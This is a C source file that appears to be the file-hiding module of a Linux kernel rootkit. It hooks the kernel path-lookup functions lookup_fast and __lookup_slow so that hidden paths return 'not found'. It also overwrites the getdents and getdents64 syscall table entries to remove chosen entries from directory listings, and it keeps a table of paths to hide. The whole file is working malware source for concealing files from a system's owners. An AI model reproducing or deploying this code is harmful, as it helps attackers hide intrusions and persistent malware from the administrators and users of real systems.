#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/namei.h>
#include <linux/stringhash.h>

#include "hide_file.h"
#include "main.h"
#include "yhook.h"

struct open_flags;

static struct dentry *(*orig_lookup_fast)(struct nameidata *nd,
                                          struct inode **inode, unsigned *seqp);
static struct dentry *hook_lookup_fast(struct nameidata *nd,
                                       struct inode **inode, unsigned *seqp) {
    struct dentry *dentry;
    struct hide_file_info *cur;
    int bkt;

    dentry = orig_lookup_fast(nd, inode, seqp);
    if (dentry) {
        hash_for_each(hide_file_info_list, bkt, cur, node) {
            if (dentry == cur->dentry) {
                return ERR_PTR(-ENOENT);
            }
        }
    }
    return dentry;
}

static struct dentry *(*orig___lookup_slow)(const struct qstr *name,
                                            struct dentry *dir,
                                            unsigned int flags);
static struct dentry *hook___lookup_slow(const struct qstr *name,
                                         struct dentry *dir,
                                         unsigned int flags) {
    struct dentry *dentry;
    struct hide_file_info *cur;
    int bkt;

    dentry = orig___lookup_slow(name, dir, flags);
    if (dentry) {
        hash_for_each(hide_file_info_list, bkt, cur, node) {
            if (dentry == cur->dentry) {
                return ERR_PTR(-ENOENT);
            }
        }
    }
    return dentry;
}

// TODO: what about readdir() syscall？

/* Definition of `struct linux_dirent' is missing in headers, let's redefine it
 * here */
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

#define HOOK_GETDENTS_TEMPLATE(hook_func_name, orig_func_name,                 \
                               linux_dirent_type)                              \
    static asmlinkage long (*orig_func_name)(const struct pt_regs *);          \
    asmlinkage long hook_func_name(const struct pt_regs *regs) {               \
        int fd = regs->di;                                                     \
        linux_dirent_type __user *dirent = (linux_dirent_type *)regs->si;      \
        linux_dirent_type *previous_dir, *current_dir, *dirent_ker;            \
        int ret;                                                               \
        long error;                                                            \
        unsigned long offset;                                                  \
        struct file *file;                                                     \
        int bkt;                                                               \
        struct hide_file_info *cur;                                            \
        struct dentry *dentry;                                                 \
        int hide_count;                                                        \
                                                                               \
        /* call to original function */                                        \
        ret = orig_func_name(regs);                                            \
        if (ret <= 0)                                                          \
            return ret;                                                        \
                                                                               \
        /* first, give a quick check if any file under this dir need to be     \
         * hidden */                                                           \
        file = fget(fd);                                                       \
        if (!file) /* failed to get `struct file *' of this fd */              \
            return ret;                                                        \
        dentry = dget(file->f_path.dentry);                                    \
        if (!dentry) { /* make sure dentry is not null */                      \
            fput(file);                                                        \
            return ret;                                                        \
        }                                                                      \
        hide_count = 0;                                                        \
        hash_for_each(hide_file_info_list, bkt, cur, node) {                   \
            if (dentry == cur->dentry->d_parent) {                             \
                /* at least one file need to be hidden */                      \
                hide_count++;                                                  \
            }                                                                  \
        }                                                                      \
        if (!hide_count) {                                                     \
            goto exit_second_stage;                                            \
        }                                                                      \
                                                                               \
        /* second, allocate a temporary memory and copy original result to */  \
        dirent_ker = kzalloc(ret, GFP_KERNEL);                                 \
        if (!dirent_ker) {                                                     \
            goto exit_second_stage;                                            \
        }                                                                      \
        error = copy_from_user(dirent_ker, dirent, ret);                       \
        if (error) {                                                           \
            goto exit_third_stage;                                             \
        }                                                                      \
                                                                               \
        /* third, iterate over the original results */                         \
        offset = 0;                                                            \
        while (offset < ret && hide_count > 0) {                               \
            int hide;                                                          \
            struct qstr child_name;                                            \
            struct dentry *child;                                              \
            current_dir = (void *)dirent_ker + offset;                         \
                                                                               \
            /* note that current_dir->d_name is null-terminated */             \
            child_name = (struct qstr){.len = strlen(current_dir->d_name),     \
                                       .name = current_dir->d_name};           \
            /* search on the children of current dentry */                     \
            child = d_hash_and_lookup(dentry, &child_name);                    \
            hide = 0;                                                          \
            if (child && !IS_ERR(child)) {                                     \
                hash_for_each(hide_file_info_list, bkt, cur, node) {           \
                    if (child == cur->dentry) {                                \
                        /* the child should be hidden from result */           \
                        hide = 1;                                              \
                        break;                                                 \
                    }                                                          \
                }                                                              \
                dput(child);                                                   \
            }                                                                  \
            if (hide) {                                                        \
                hide_count--;                                                  \
                if (current_dir == dirent_ker) {                               \
                    /* if we are hidding the first dirent, we just need to     \
                     * move the rest of the content forward. */                \
                    ret -= current_dir->d_reclen;                              \
                    memmove(current_dir,                                       \
                            (void *)current_dir + current_dir->d_reclen, ret); \
                    goto next_iter;                                            \
                }                                                              \
                /* Otherwise, we just increase the length of the previous      \
                 * linux_dirent by the length of current dirent. */            \
                previous_dir->d_reclen += current_dir->d_reclen;               \
            } else {                                                           \
                previous_dir = current_dir;                                    \
            }                                                                  \
            offset += current_dir->d_reclen;                                   \
        next_iter: continue;                                                   \
        }                                                                      \
                                                                               \
        /* finally, copy back to overwrite the original results */             \
        error = copy_to_user(dirent, dirent_ker, ret);                         \
                                                                               \
    exit_third_stage:                                                          \
        kfree(dirent_ker);                                                     \
    exit_second_stage:                                                         \
        dput(dentry);                                                          \
        fput(file);                                                            \
        return ret;                                                            \
    }

HOOK_GETDENTS_TEMPLATE(hook_getdents, orig_getdents, struct linux_dirent)
HOOK_GETDENTS_TEMPLATE(hook_getdents64, orig_getdents64, struct linux_dirent64)

DECLARE_HASHTABLE(hide_file_info_list, HIDE_FILE_HASH_TABLE_BITS);

char lookup_fast_name[] = "lookup_fast*";

int hide_file_init(void) {
    hash_init(hide_file_info_list);

    /* forbid looking up hidden files/directories */
    hook_function_name_add(lookup_fast_name, hook_lookup_fast,
                           &orig_lookup_fast);
    hook_function_name_add("__lookup_slow", hook___lookup_slow,
                           &orig___lookup_slow);

    /* hide file from result of getdents() and getdents64() */
    hook_sys_call_table(__NR_getdents, hook_getdents, &orig_getdents);
    hook_sys_call_table(__NR_getdents64, hook_getdents64, &orig_getdents64);

    return 0;
}

static void release_all_info(void) {
    struct hide_file_info *cur;
    int bkt;

    hash_for_each(hide_file_info_list, bkt, cur, node) {
        hash_del(&cur->node);
        dput(cur->dentry);
        kfree(cur->path.name);
        kfree(cur);
    }
}

int hide_file_exit(void) {
    unhook_sys_call_table(__NR_getdents64, orig_getdents64);
    unhook_sys_call_table(__NR_getdents, orig_getdents);

    hook_function_del("__lookup_slow");
    hook_function_del(lookup_fast_name);

    release_all_info();
    return 0;
}

int hide_file_add(const char *pathname) {
    struct hide_file_info *cur;
    struct hide_file_info *info;
    u64 hash_len;
    char *name_owned;
    struct dentry *dentry;
    int ret = 0;
    struct path path;

    /* calculate hash of path */
    hash_len = hashlen_string(NULL, pathname);

    /* check if already hidden */
    hash_for_each_possible(hide_file_info_list, cur, node,
                           hashlen_hash(hash_len)) {
        if (cur->path.len == hashlen_len(hash_len) &&
            !strncmp(cur->path.name, pathname, hashlen_len(hash_len)))
            return 0;
    }

    /* lookup this path on filesystem, and obtain dentry of it */
    ret = kern_path(pathname, 0, &path);
    if (ret) {
        pr_info(LOG_PREFIX "failed to lookup path, error: %d pathname: %s\n",
                ret, pathname);
        return ret;
    }
    dentry = dget(path.dentry);
    path_put(&path);

    info = (struct hide_file_info *)kmalloc(sizeof(struct hide_file_info),
                                            GFP_KERNEL);
    if (!info) {
        dput(dentry);
        return -ENOMEM;
    }

    name_owned = (char *)kmalloc(hashlen_len(hash_len) + 1, GFP_KERNEL);
    if (!name_owned) {
        kfree(info);
        dput(dentry);
        return -ENOMEM;
    }

    memcpy(name_owned, pathname, hashlen_len(hash_len));
    name_owned[hashlen_len(hash_len)] = '\0';

    info->path = (struct qstr){.hash_len = hash_len, .name = name_owned};
    info->dentry = dentry;
    hash_add(hide_file_info_list, &info->node, info->path.hash);
    return 0;
}

int hide_file_del(const char *pathname) {
    struct hide_file_info *cur;
    u64 hash_len;

    hash_len = hashlen_string(NULL, pathname);
    hash_for_each_possible(hide_file_info_list, cur, node,
                           hashlen_hash(hash_len)) {
        if (cur->path.len == hashlen_len(hash_len) &&
            !strncmp(cur->path.name, pathname, hashlen_len(hash_len))) {
            hash_del(&cur->node);
            dput(cur->dentry);
            kfree(cur->path.name);
            kfree(cur);
            break;
        }
    }
    return 0;
}
